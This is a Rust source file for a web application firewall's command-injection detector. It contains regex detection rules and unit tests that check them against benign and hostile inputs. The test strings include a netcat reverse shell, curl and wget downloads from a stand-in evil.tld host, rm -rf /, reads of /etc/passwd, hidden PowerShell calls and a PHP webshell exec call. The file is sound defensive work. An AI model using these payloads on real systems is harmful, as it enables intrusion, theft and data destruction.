use std::sync::LazyLock;

use regex::RegexSet;
use waf_common::{DetectionResult, Phase, RequestCtx};

use super::{Check, Lane1BodyBudget, request_targets};

static RCE_DESCS: &[&str] = &[
    "shell command via pipe/semicolon (|; with command)",
    "$() command substitution",
    "backtick command substitution",
    "/etc/passwd path traversal",
    "/proc/self LFI",
    "/etc/shadow LFI",
    "&& chained command execution",
    "PHP code injection (<?php)",
    "cmd.exe execution",
    "PowerShell execution",
    "base64_decode() (common in webshells)",
    "system() call",
    "exec() call",
    "passthru() call",
    "shell_exec() call",
    "popen() call",
    "Windows %SYSTEMROOT%",
    "curl to external host (possible SSRF/C2)",
    "wget to external host",
    "nc/netcat reverse shell",
    "interpreter exec flag (sh -c / python -c / perl -e)",
];

/// Fail-closed compile result (Low-1): see the equivalent comment in
/// `sql_injection.rs` for the full rationale. `None` means the pattern set
/// failed to compile; `check()` then treats every request as a match
/// (fail-closed) instead of falling back to `RegexSet::empty()`, which would
/// match nothing and fail open.
static RCE_SET: LazyLock<Option<RegexSet>> = LazyLock::new(|| {
    match RegexSet::new([
        // ── RCE-001 — separator followed by a shell command ──────────────────
        //
        // The original pattern was a bare `[|;`]\s*(cat|ls|…|id|…)` and blocked
        // any text that merely *contained* a pipe next to a common word:
        // `name | id | email` (an API field list), a markdown table row
        // `| id | name | php |`, a cookie string `sid=abc; id=42`, or the
        // inline code span `` `ls -la` `` in a doc. That is a 403 on ordinary
        // business traffic, so the pattern now demands the *structure* of an
        // injection instead of the presence of a word. Three discriminations,
        // all of them things a regex can still see:
        //
        //  1. **Value-boundary prefix** — the separator must directly follow ONE
        //     unbroken token that itself starts at a value boundary (start of
        //     input, `=`, `"`, `:`, `,`, `[`, `{`, `(`, `?`, `'`). An injected
        //     payload is appended to a parameter value (`?cmd=1;id`,
        //     `{"cmd":"x|whoami"}`), so the data always sits directly in front
        //     of the separator. Prose and tables put whitespace there
        //     (`name | id`, `cd /tmp && rm -rf build`, `` Use `ls -la` ``) and
        //     no longer match. This is the regex-level stand-in for the AST
        //     rule's "leading stage must be a bare injected value"
        //     (`rce_ast.cmd_chain_injection` in content_security/detectors.rs).
        //  2. **Lower-case only** — only a lower-case name actually executes on
        //     a POSIX backend, so dropping `(?i)` removes title-cased prose
        //     (`Alexa | Echo Dot`, `Status | ID`) for free.
        //  3. **Command class decides how much context is required**:
        //       * unambiguous names (`whoami`, `mkfifo`, `wget`, …) are never
        //         field names, so a bare occurrence is enough;
        //       * ambiguous names (`id`, `cat`, `ls`, `php`, `base64`, `rm`,
        //         `echo`, …) are ordinary words, so they need either a non-pipe
        //         separator (`;`, `&&`, backtick, `||` — `x;id`) or an argument
        //         (`x|base64 -d`, `1|echo pwned`). `?sort=name|id` and
        //         `{"encoding":"hex|base64"}` stay clean;
        //       * destructive/exfil names (`rm`, `chmod`, `dd`, `curl`, …) get
        //         the one relaxation that lets a single space sit before the
        //         separator, but only with a flag or path argument — this is
        //         what makes `x && rm -rf /` visible to Lane1 while a pasted
        //         transcript (`cd /tmp && rm -rf build`) still passes, because
        //         its separator follows a *second* token, not the value head.
        //
        // A trailing `[^\w=.|-]`/end guard keeps `;id=42` (a cookie pair) and
        // `|id|name|` (a field list) out while `;id` at the end of a value and
        // `;id ` in front of an argument still fire.
        concat!(
            // (1) value-boundary prefix
            r#"(?:^[^\s|;&`]{1,64}|[=?:,"'\[{(][^\s|;&`]{0,64})"#,
            r"(?:",
            // (a) any separator + unambiguous command, bare
            r"[|;&`]{1,2}[ \t]{0,4}",
            r"(?:whoami|uname|passthru|popen|mkfifo|chmod|nmap|ncat|wget|curl|bash|zsh)",
            r"(?:$|[^\w=.|-])",
            r"|",
            // (b) non-pipe separator + ambiguous command, bare
            r"(?:[;&`]{1,2}|\|\|)[ \t]{0,4}",
            r"(?:cat|ls|dir|sh|fish|nc|python[23]?|perl|ruby|php|exec|system|id|rm|echo|base64)",
            r"(?:$|[^\w=.|-])",
            r"|",
            // (c) any separator + ambiguous command carrying an argument
            r"[|;&`]{1,2}[ \t]{0,4}",
            r"(?:cat|ls|dir|sh|fish|nc|python[23]?|perl|ruby|php|exec|system|id|rm|echo|base64)",
            r#"[ \t]{1,4}[^\s;|&"'\]}]"#,
            r"|",
            // (d) one space tolerated before the separator, but only for a
            //     destructive/exfil command with a flag or path argument
            r"[ \t]{0,3}[|;&`]{1,2}[ \t]{0,4}",
            r"(?:rm|chmod|chown|mkfifo|dd|shred|nc|ncat|netcat|wget|curl|base64|bash|sh|zsh|python[23]?|perl|ruby|php|cat)",
            r"[ \t]{1,4}(?:[^\s;|&]{1,40}[ \t]{1,4}){0,1}(?:[-+]{1,2}[a-z0-9]|[^\s;|&]{0,40}/)",
            r")",
        ),
        // ── RCE-002 — $() command substitution ───────────────────────────────
        // `$ (…)` with a space is NOT command substitution in any shell, so the
        // original `\$\s*\(` only added false positives on prose
        // (`total is $ (USD) 42`). Requiring the tight `$(` and rejecting a
        // following `.`/`(` also clears the single most common benign hit:
        // jQuery (`$(document).ready(…)`, `$('#a').val(1)`).
        r"\$\([^)]{1,200}\)(?:$|[^.(])",
        // ── RCE-003 — backtick command substitution ──────────────────────────
        // `` `[^`]{1,200}` `` matched every markdown inline code span, i.e. a
        // 403 on any doc/comment/issue body. Same value-boundary prefix as
        // RCE-001 (an injected `` `id` `` sits directly behind the value head,
        // a code span in prose does not) plus the requirement that the span
        // actually starts with a command word.
        concat!(
            r#"(?:^[^\s|;&`]{1,64}|[=?:,"'\[{(][^\s|;&`]{0,64})"#,
            r"`[ \t]{0,4}(?:/[a-z][a-z0-9/_.-]{0,24}/)?",
            r"(?:cat|ls|dir|id|whoami|uname|wget|curl|nc|ncat|nmap|bash|sh|zsh|python[23]?|perl|ruby|php",
            r"|rm|chmod|mkfifo|echo|base64|touch|mv|cp|dd|env|printenv|hostname|ifconfig|netstat|ps|which",
            r"|system|exec|powershell|cmd)",
            r"\b[^`]{0,200}`",
        ),
        // Sensitive file paths
        r"(?i)/etc/passwd",
        r"(?i)/proc/self",
        r"(?i)/etc/shadow",
        // ── RCE-007 — `&&` chained command ───────────────────────────────────
        // Same value-boundary prefix as RCE-001 (see there), which is what
        // separates an injected `?x=1 && ls` from a pasted transcript
        // (`cd /tmp && ls`) or prose. Because the prefix already does the
        // filtering, a *bare* command with spaces around `&&` is safe to keep
        // here — that is the one shape RCE-001 branch (a)/(b) cannot see.
        concat!(
            r#"(?:^[^\s|;&`]{1,64}|[=?:,"'\[{(][^\s|;&`]{0,64})[ \t]{0,3}"#,
            r"&&[ \t]{0,4}(?:cat|ls|wget|curl|bash|sh|nc|nmap|python|perl|ruby|rm|chmod|echo|base64|mkfifo)\b",
        ),
        // PHP opening tag
        r"<\?php",
        // ── RCE-009 — cmd.exe ────────────────────────────────────────────────
        // The bare word blocked every Windows incident ticket that names the
        // binary ("cmd.exe crashed on the CI runner"). An execution attempt is
        // either a full path to the binary or an invocation with a switch.
        r"(?i)(?:[\\/]cmd\.exe\b|cmd\.exe\b[\s\x22']{0,4}[/-][a-z])",
        // ── RCE-010 — PowerShell ─────────────────────────────────────────────
        // Same reasoning: `\bpowershell\b` blocked "run the powershell script".
        // Require the invocation shape (a path, or a switch such as `-nop`,
        // `-enc`, `-w hidden`).
        r"(?i)(?:[\\/]powershell(?:\.exe)?\b|\bpowershell(?:\.exe)?\b[\s\x22']{0,4}[-/][a-z])",
        // PHP functions commonly used in webshells
        r"(?i)\bbase64_decode\s*\(",
        r"(?i)\bsystem\s*\(",
        // `exec(` — but not the JavaScript method call `re.exec(s)` /
        // `$exec(`, which is ordinary code in a snippet-sharing or code-review
        // payload. A PHP webshell `exec($_GET['c'])` still fires.
        r"(?i)(?:^|[^\w.$])exec\s*\(",
        r"(?i)\bpassthru\s*\(",
        r"(?i)\bshell_exec\s*\(",
        r"(?i)\bpopen\s*\(",
        // Windows %SYSTEMROOT%
        r"(?i)%SystemRoot%",
        // ── RCE-018/019 — curl / wget fetching an external URL ───────────────
        // `\bcurl\s+https?://` blocked every API-documentation payload that
        // shows a copy-paste example, which is the single most common body an
        // API/dev-tools product receives. What makes a fetch an attack is that
        // it is *chained onto something else* — a separator in front of it —
        // not that a URL follows the word. The chained form is what RCE-001
        // branch (d) sees too; these keep their own rule id for the flagged
        // variants (`;curl -sk -o /tmp/p https://…`).
        r"(?i)[|;&`][ \t]{0,4}curl[ \t]+(?:-{1,2}[a-z]{1,12}[ \t]+){0,4}https?://",
        r"(?i)[|;&`][ \t]{0,4}wget[ \t]+(?:-{1,2}[a-z]{1,12}[ \t]+){0,4}https?://",
        // ── RCE-020 — netcat reverse / bind shell ────────────────────────────
        // The original `\bnc\b.*-[el]` had an unbounded `.*`: any text
        // containing the token `nc` and, anywhere later in the same value, a
        // `-e`/`-l` matched (`{"state":"nc","tag":"e-learning"}`). The flag has
        // to belong to the same invocation, so it must arrive within a few
        // argument tokens.
        r"(?i)\bnc(?:at)?[ \t]+(?:[^\s;|&]{1,40}[ \t]+){0,4}-[el]\b",
        // Interpreter exec flag: `sh -c id`, `bash -c "..."`, `python -c "..."`,
        // `perl -e`, `ruby -e`, `node -e`, `--command`/`-eval` variants. Plain
        // command injection through an interpreter that carries no shell
        // metacharacter otherwise slips past every pattern above.
        r"(?i)\b(?:sh|bash|zsh|ksh|dash|ash|busybox|python[0-9.]*|perl|ruby|node|nodejs|php|pwsh|powershell)\s+-{1,2}(?:c|e|eval|command)\b",
    ]) {
        Ok(set) => Some(set),
        Err(e) => {
            tracing::error!(
                "BUG: RCE regex set failed to compile: {e} — failing closed \
                 (this checker will now flag every request until the code is fixed)"
            );
            None
        }
    }
});

/// Remote Code Execution / Command Injection detection checker.
pub struct RceCheck {
    /// How much request body this detector will read. See [`Lane1BodyBudget`].
    body_budget: Lane1BodyBudget,
}

impl RceCheck {
    /// The detector with **no** body budget — the pre-budget behaviour.
    ///
    /// Not the shipping construction: the engine builds all four detectors
    /// through [`Self::with_body_budget`] with the compiled
    /// `[content_security.lane1]` budget, which defaults to 64 KiB. This
    /// constructor exists for callers that thread no operator config at all —
    /// the G1 parity suite and unit tests — where an unbounded body is what the
    /// frozen comparison needs.
    pub const fn new() -> Self {
        Self {
            body_budget: Lane1BodyBudget::UNLIMITED,
        }
    }

    /// The same detector under an operator-configured Lane 1 body budget.
    #[must_use]
    pub const fn with_body_budget(body_budget: Lane1BodyBudget) -> Self {
        Self { body_budget }
    }
}

impl Default for RceCheck {
    fn default() -> Self {
        Self::new()
    }
}

impl Check for RceCheck {
    fn check(&self, ctx: &RequestCtx) -> Option<DetectionResult> {
        if !ctx.host_config.defense_config.rce {
            return None;
        }

        let Some(set) = RCE_SET.as_ref() else {
            // Fail-closed: the pattern set failed to compile at startup.
            return Some(DetectionResult {
                rule_id: Some("RCE-000".to_string()),
                rule_name: "RCE".to_string(),
                phase: Phase::Rce,
                detail: "fail-closed: RCE pattern set failed to compile at startup".to_string(),
            });
        };

        for (location, value) in request_targets(ctx, self.body_budget) {
            let matches = set.matches(&value);
            if matches.matched_any() {
                let idx = matches.iter().next().unwrap_or(0);
                let desc = RCE_DESCS.get(idx).copied().unwrap_or("RCE pattern");
                return Some(DetectionResult {
                    rule_id: Some(format!("RCE-{:03}", idx + 1)),
                    rule_name: "RCE".to_string(),
                    phase: Phase::Rce,
                    detail: format!("{desc} detected in {location}"),
                });
            }
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use bytes::Bytes;
    use std::collections::HashMap;
    use std::net::IpAddr;
    use std::sync::Arc;
    use waf_common::{DefenseConfig, HostConfig};

    fn make_ctx(query: &str, body: &str) -> RequestCtx {
        RequestCtx {
            req_id: "test".to_string(),
            client_ip: "127.0.0.1".parse::<IpAddr>().unwrap(),
            client_port: 0,
            method: "POST".to_string(),
            host: "example.com".to_string(),
            port: 80,
            path: "/".to_string(),
            query: query.to_string(),
            headers: HashMap::new(),
            body_preview: Bytes::from(body.to_string()),
            content_length: body.len() as u64,
            is_tls: false,
            host_config: Arc::new(HostConfig {
                defense_config: DefenseConfig {
                    rce: true,
                    ..DefenseConfig::default()
                },
                ..HostConfig::default()
            }),
            geo: None,
        }
    }

    #[test]
    fn detects_pipe_command() {
        let checker = RceCheck::new();
        let ctx = make_ctx("cmd=ls|cat /etc/passwd", "");
        assert!(checker.check(&ctx).is_some());
    }

    #[test]
    fn detects_etc_passwd() {
        let checker = RceCheck::new();
        let ctx = make_ctx("file=../../etc/passwd", "");
        assert!(checker.check(&ctx).is_some());
    }

    #[test]
    fn detects_subshell() {
        let checker = RceCheck::new();
        let ctx = make_ctx("", "cmd=$(id)");
        assert!(checker.check(&ctx).is_some());
    }

    #[test]
    fn allows_clean_request() {
        let checker = RceCheck::new();
        let ctx = make_ctx("action=save&name=hello", "");
        assert!(checker.check(&ctx).is_none());
    }

    #[test]
    fn detects_interpreter_exec_flag() {
        let checker = RceCheck::new();
        for payload in [
            "cmd=sh -c id",
            "cmd=bash -c \"whoami\"",
            "cmd=python -c print(1)",
            "x=perl -e system",
        ] {
            let ctx = make_ctx(payload, "");
            let hit = checker.check(&ctx);
            assert!(hit.is_some(), "interpreter exec flag must be detected: {payload}");
            assert_eq!(
                hit.and_then(|r| r.rule_id).as_deref(),
                Some("RCE-021"),
                "new pattern must be the last rule id (indices below it unchanged): {payload}"
            );
        }
    }

    /// The reported production false positive: an API field list. A pipe next
    /// to the word `id` is a column enumeration, not command injection.
    #[test]
    fn field_list_with_pipes_is_allowed() {
        let checker = RceCheck::new();
        for (query, body) in [
            ("fields=name | id | email", ""),
            ("", r#"{"fields":"name | id | email"}"#),
            ("", "| id | name | php | ruby |\n|----|----|----|----|"),
            ("", r#"{"title":"Home | About | Contact"}"#),
            ("sort=name|id", ""),
            ("", r#"{"filter":"type|id|name"}"#),
            ("", r#"{"encoding":"hex|base64","charset":"utf-8"}"#),
            ("", r#"{"shells":"sh|bash|zsh"}"#),
            ("", r#"{"pets":"cat|fish|dog"}"#),
            ("", r#"{"states":"ab|nc|ny"}"#),
        ] {
            let ctx = make_ctx(query, body);
            assert!(
                checker.check(&ctx).is_none(),
                "field/enumeration list must not fire: {query:?} {body:?}"
            );
        }
    }

    /// Ops / documentation payloads that merely *mention* shell syntax.
    #[test]
    fn documentation_and_ops_text_is_allowed() {
        let checker = RceCheck::new();
        for body in [
            "Use `ls -la` and `git status` to inspect the tree",
            r#"{"tpl":"`code` and `git diff` are inline"}"#,
            r#"{"note":"rm is a Unix command; echo prints text"}"#,
            r#"{"cmd_doc":"cd /tmp && rm -rf build   # pasted shell transcript"}"#,
            r#"{"ticket":"chmod on /srv/app was wrong; please review"}"#,
            r#"{"cookie_like":"sid=abc123; id=42; path=/"}"#,
            r#"{"style":"color:red; background:blue; display:none"}"#,
            r#"{"body":"Please run the migration; then verify the report"}"#,
            r#"{"price":"total is $ (USD) 42 (approx)"}"#,
            r#"{"jq":"$(document).ready(function(){ $('#a').val(1); });"}"#,
            r#"{"snippet":"const m = re.exec(s); el.textContent = m[0];"}"#,
            r#"{"build":"npm run build","start":"node server.js"}"#,
            r#"{"device":"Alexa | Echo Dot","status":"Online | Ready"}"#,
        ] {
            let ctx = make_ctx("", body);
            assert!(checker.check(&ctx).is_none(), "benign document must not fire: {body}");
        }
    }

    /// The tight injection shapes the narrowing must keep: a payload appended
    /// directly to a parameter value.
    #[test]
    fn tight_injection_shapes_still_detected() {
        let checker = RceCheck::new();
        for (query, body) in [
            ("id=1;id", ""),
            ("x=1|whoami", ""),
            ("x=1||id", ""),
            ("x=1&&whoami", ""),
            ("cmd=ls|cat /etc/passwd", ""),
            ("", r#"{"cmd":"1|echo pwned"}"#),
            ("", r#"{"cmd":"x|base64 -d"}"#),
            ("", r#"{"cmd":"x;chmod 777 /tmp/s"}"#),
            ("", r#"{"cmd":"x;mkfifo /tmp/f"}"#),
            ("", r#"{"cmd":"foo;rm -rf /var/www"}"#),
            ("", r#"{"cmd":"x; cat /etc/passwd"}"#),
            ("", r#"{"cmd":"a|nc -e /bin/sh 1.2.3.4 4444"}"#),
            ("", r#"{"cmd":"index.php;wget http://evil.tld/s.sh"}"#),
        ] {
            let ctx = make_ctx(query, body);
            assert!(
                checker.check(&ctx).is_some(),
                "command injection must still fire: {query:?} {body:?}"
            );
        }
    }

    /// `x && rm -rf /` — the Lane1 gap this narrowing closes: a destructive
    /// command reached through a separator that has a space in front of it.
    #[test]
    fn spaced_chain_into_destructive_command_is_detected() {
        let checker = RceCheck::new();
        for body in [
            r#"{"cmd":"x && rm -rf /"}"#,
            r#"{"cmd":"x | base64 -d"}"#,
            r#"{"cmd":"x ; curl -o /tmp/p http://evil.tld/p"}"#,
        ] {
            let ctx = make_ctx("", body);
            assert!(checker.check(&ctx).is_some(), "destructive chain must fire: {body}");
        }
    }

    /// Backtick substitution: an injected value fires, a markdown code span
    /// with a non-shell word does not.
    #[test]
    fn backtick_substitution_narrowed_to_injected_values() {
        let checker = RceCheck::new();
        let hit = make_ctx("", r#"{"cmd":"`id`"}"#);
        assert!(checker.check(&hit).is_some(), "injected backtick must fire");
        let miss = make_ctx("", "the `README.md` file and `MyClass::run()` helper");
        assert!(checker.check(&miss).is_none(), "prose code span must not fire");
    }

    /// `$( … )` narrowing: substitution fires, jQuery / prose do not.
    #[test]
    fn subshell_narrowed_to_tight_form() {
        let checker = RceCheck::new();
        let hit = make_ctx("cmd=$(cat /etc/passwd)", "");
        assert!(checker.check(&hit).is_some(), "command substitution must fire");
        let miss = make_ctx("", r#"{"q":"cost is $ (USD)"}"#);
        assert!(checker.check(&miss).is_none(), "spaced dollar-paren must not fire");
    }

    /// `exec(` still catches a PHP webshell but not a JS method call.
    #[test]
    fn exec_call_ignores_method_invocation() {
        let checker = RceCheck::new();
        let hit = make_ctx("", r#"{"x":"exec($_GET['c'])"}"#);
        assert!(checker.check(&hit).is_some(), "php exec() must fire");
        let miss = make_ctx("", r#"{"x":"const m = pattern.exec(input);"}"#);
        assert!(checker.check(&miss).is_none(), "js .exec() must not fire");
    }

    /// Tool names mentioned in tickets and API documentation are not
    /// invocations. (`curl https://…` is the single most common body an
    /// API-docs product receives.)
    #[test]
    fn tool_names_in_documentation_are_allowed() {
        let checker = RceCheck::new();
        for body in [
            r#"{"doc":"curl https://api.example.com/v1/users -H 'Accept: application/json'"}"#,
            r#"{"doc":"wget https://cdn.example.com/pkg.tar.gz to fetch the bundle"}"#,
            r#"{"note":"run the powershell script on the build agent"}"#,
            r#"{"note":"cmd.exe crashed on the CI runner"}"#,
            r#"{"state":"nc","tag":"e-learning"}"#,
        ] {
            let ctx = make_ctx("", body);
            assert!(
                checker.check(&ctx).is_none(),
                "tool name in prose must not fire: {body}"
            );
        }
    }

    /// …but the invocation shapes of those same tools must still fire.
    #[test]
    fn tool_invocations_still_detected() {
        let checker = RceCheck::new();
        for body in [
            r#"{"cmd":"a;curl -sk -o /tmp/p https://evil.tld/p"}"#,
            r#"{"cmd":"a|wget https://evil.tld/s.sh"}"#,
            r#"{"cmd":"powershell -nop -w hidden -enc SQBFAFgA"}"#,
            r#"{"cmd":"cmd.exe /c whoami"}"#,
            r#"{"cmd":"C:\\Windows\\System32\\cmd.exe"}"#,
            r#"{"cmd":"nc 1.2.3.4 4444 -e /bin/sh"}"#,
            r#"{"cmd":"nc -l -p 4444"}"#,
        ] {
            let ctx = make_ctx("", body);
            assert!(checker.check(&ctx).is_some(), "tool invocation must fire: {body}");
        }
    }

    #[test]
    fn interpreter_without_exec_flag_is_allowed() {
        // A bare interpreter name with no exec flag is not command injection on
        // its own and must not fire this rule.
        let checker = RceCheck::new();
        let ctx = make_ctx("lang=bash&level=beginner", "");
        assert!(checker.check(&ctx).is_none());
    }
}
